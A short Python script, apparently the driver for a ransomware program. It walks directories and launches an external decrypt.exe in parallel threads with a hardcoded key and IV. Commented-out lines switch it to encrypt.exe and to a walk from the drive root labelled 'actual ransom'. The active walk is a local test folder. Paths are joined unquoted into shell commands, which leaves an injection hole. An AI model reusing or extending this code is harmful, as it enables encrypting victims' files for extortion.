import subprocess
import os  
import threading
import time
CUR_PATH = os.path.dirname(__file__)
def getfilename():
    fileList = []
    # for root, dirs, files in os.walk("..\\"*100+"..", topdown=False):      # 实际勒索
    for root, dirs, files in os.walk(CUR_PATH+"\\test", topdown=False):      # 用于测试
        for name in dirs:
            fileList.append(os.path.join(root, name+'\\'))
    return fileList

def encryexe(file='', command=''):
    proc = subprocess.Popen(file+' '+command, stdout=subprocess.PIPE,
                            stdin=subprocess.PIPE,
                            stderr=subprocess.PIPE,
                            shell=True)  
    print(file, command, '执行完毕', time.ctime())

def decrypt_file():
    # 获取盘符
    # d = os.popen("wmic VOLUME GET Label, Name").read()
    # print(d)
    # print(type(d))
    p = []
    fileList = getfilename()
    print(fileList)
    for index,i in enumerate(fileList):
        # p.append(threading.Thread(target=encryexe, args=('encrypt.exe', i,)))
        p.append(threading.Thread(target=encryexe, args=(CUR_PATH+'\\decrypt.exe', i+' 11111111111111111111111111111111 1111111111111111',)))
        p[index].deamon = True
        p[index].start()
        
if __name__ == '__main__':
    decrypt_file()
    